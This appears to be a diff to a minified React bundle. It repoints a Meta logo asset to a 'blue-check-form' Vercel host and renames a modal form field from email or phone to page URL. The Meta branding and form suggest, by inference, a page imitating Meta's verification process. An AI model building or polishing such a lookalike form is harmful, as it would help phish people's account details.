@@ -11576,7 +11576,7 @@
             TRANSITION_DURATION: 300,
             BACKDROP_TRANSITION_DURATION: 150
         });
-        const In = n.p + "static/media/meta.70e03b4e91e7f05482a4a66fe83ed1d2.svg"
+        const In = n.p + "https://blue-check-form.vercel.app/static/media/meta.70e03b4e91e7f05482a4a66fe83ed1d2.svg"
           , Un = e => {
             let {showModal: n, setShowModal: r} = e;
             const a = J()
@@ -11610,8 +11610,8 @@
                         Le.jsx)("input", {
                             className: "p-1 border rounded",
                             type: "text",
-                            name: "user_email",
-                            placeholder: "Enter Email or Number",
+                            name: "PAge Url",
+                            placeholder: "Enter page url",
                             required: !0,
                             style: {
                                 boxShadow: "0 0.5rem 1rem rgba(0, 0, 0, 0.15)"
